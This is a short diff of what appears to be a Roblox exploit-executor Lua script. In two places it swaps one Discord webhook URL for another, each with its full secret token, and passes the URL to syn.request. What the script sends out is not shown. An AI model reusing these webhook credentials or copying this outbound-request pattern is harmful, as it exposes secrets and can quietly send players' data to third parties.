@@ -17,7 +17,7 @@ if raw_g == rawget then
 -- script here   
 
         HttpService = game:GetService("HttpService")
-        Webhook_URL = "https://discord.com/api/webhooks/1048162902273708032/Gl79WaZvjcxP-EGPPMjBUcojhAct6NUQsAnRFtPR2C8eROu6a0ektX4dbyJMgr80Y00o"
+        Webhook_URL = "https://discord.com/api/webhooks/1066870542457643030/qHtabd5txHq1pQWbLPBfEAsRB3VtXK7DpuyAVQD3rcNVksGg7zm-cnJrUc10SIXAQ8FH"
         
         local responce = syn.request(
         {
@@ -274,7 +274,7 @@ if raw_g == rawget then
         
     else
         HttpService = game:GetService("HttpService")
-        Webhook_URL = "https://discord.com/api/webhooks/1048162902273708032/Gl79WaZvjcxP-EGPPMjBUcojhAct6NUQsAnRFtPR2C8eROu6a0ektX4dbyJMgr80Y00o"
+        Webhook_URL = "https://discord.com/api/webhooks/1066870542457643030/qHtabd5txHq1pQWbLPBfEAsRB3VtXK7DpuyAVQD3rcNVksGg7zm-cnJrUc10SIXAQ8FH"
         
         local responce = syn.request(
         {
